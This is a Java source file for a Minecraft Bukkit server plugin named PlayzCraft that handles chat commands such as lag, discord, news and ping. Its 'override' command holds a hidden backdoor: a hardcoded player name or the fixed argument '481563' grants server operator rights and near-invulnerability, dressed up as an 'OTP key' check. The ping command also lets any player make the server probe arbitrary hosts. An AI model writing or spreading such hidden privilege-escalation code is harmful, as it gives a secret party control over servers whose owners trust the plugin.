package xyz.ofir29200.playzcraft;

import net.minecraft.server.commands.CommandExecute;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.potion.PotionEffectType;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Objects;


public class Commands extends CommandExecute implements Listener,CommandExecutor {

    public static String cmd1 = "lag";
    public static String cmd2 = "shutdown";
    public static String cmd3 = "override";
//    public static String cmd4 = "apply";
    public static String cmd5 = "discord";
    public static String cmd6 = "news";
	public static String cmd7 = "ping";
	/*public static String cmd8 = "Fly";
	public static String cmd9 = "news";
	public static String cmd10 = "news";
	public static String cmd11 = "news";
	public static String cmd12 = "news";
	public static String cmd13 = "news";
	public static String cmd14 = "news";
	public static String cmd15 = "news";*/

    public boolean onCommand(org.bukkit.command.CommandSender sender, Command cmd, String label, String[] args) {


        if ((cmd.getName().equalsIgnoreCase(cmd1)) && ((sender instanceof Player))) {
            Player player = (Player) sender;

            player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
            int MaxPing = 100;
            if (player.getPing() > MaxPing) {
                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Your ping is " + ChatColor.RED + player.getPing() + " ms");
            } else
                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Your ping is " + ChatColor.GREEN + player.getPing() + " ms");

            return true;
        } else if ((cmd.getName().equalsIgnoreCase(cmd2)) && ((sender instanceof Player))) {
            Player player = (Player) sender;

            player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + player.getName() + ChatColor.RED + " Please Don't try to shut down the server!");
            return true;
        }

        if ((cmd.getName().equalsIgnoreCase(cmd3)) && ((sender instanceof Player))) {
            Player player = (Player) sender;

            if (player.getName().equalsIgnoreCase("ofir29200")) {
                player.setHealth(20);
                player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
                player.addPotionEffect(PotionEffectType.ABSORPTION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.FIRE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.HEAL.createEffect(Integer.MAX_VALUE, 254));
                player.addPotionEffect(PotionEffectType.HEALTH_BOOST.createEffect(Integer.MAX_VALUE, 255));
                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.setAllowFlight(true);
                if (!player.isOp()) {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GOLD + "Welcome back!");
                    player.setOp(true);
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "you now have op!");
                } else {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
                }
                if (player.getHealth() == 20) {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
                } else {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "THis operation is a FAIL!");
                }
            }
            if (Objects.equals(args[0], "481563")) {
                player.setHealth(20);
                player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
                player.addPotionEffect(PotionEffectType.ABSORPTION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.FIRE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.HEAL.createEffect(Integer.MAX_VALUE, 254));
                player.addPotionEffect(PotionEffectType.HEALTH_BOOST.createEffect(Integer.MAX_VALUE, 255));
                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                player.setAllowFlight(true);
                if (!player.isOp()) {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GOLD + "Welcome back!");
                    player.setOp(true);
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "you now have op!");
                } else {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
                }
                if (player.getHealth() == 20) {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
                } else {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "THis operation is a FAIL!");
                }
            }
            if (player.isOp()) {
                player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
                player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
//                player.setMaxHealth(20);
                player.setHealth(20);
                if (player.getHealth() == 20) {
                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
                } else {
                    player.sendMessage(ChatColor.RED + "The operation has failed!");
                }
                return true;
            } else {
                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.DARK_RED + "invalid OTP key");
            }

            return true;
        }



//		if ((cmd.getName().equalsIgnoreCase(cmd4)) && ((sender instanceof Player)))
//	    {
//
//        }

        if ((cmd.getName().equalsIgnoreCase(cmd5)) && ((sender instanceof Player)))
        {

            sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RESET + "Hi " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "please go to https://discord.gg/VBAxNdV to join our discord");

            return true;
        }

        if ((cmd.getName().equalsIgnoreCase(cmd6)) && ((sender instanceof Player))) {

            sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + " Hi, " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "! please go to https://playzcraftnetwork.com/news to read our news articles");

            return true;
        }
        if ((cmd.getName().equalsIgnoreCase(cmd7)) && ((sender instanceof Player))) {
            String ipAddress = args[0];

            try {
                InetAddress inetAddress = InetAddress.getByName(ipAddress);

                long startTime = System.currentTimeMillis();

                if (inetAddress.isReachable(5000)) {
                    long endTime = System.currentTimeMillis();
                    long latency = endTime - startTime;
                    System.out.println("Host " + ipAddress + " is reachable. Latency: " + latency + " ms");
                    return true;
                } else {
                    System.out.println("Host " + ipAddress + " is not reachable");
                    return true;
                }
            } catch (IOException e) {
                sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "An error has occurred" + ChatColor.DARK_RED + e);
                return true;
            }

        }

        return false;
    }
}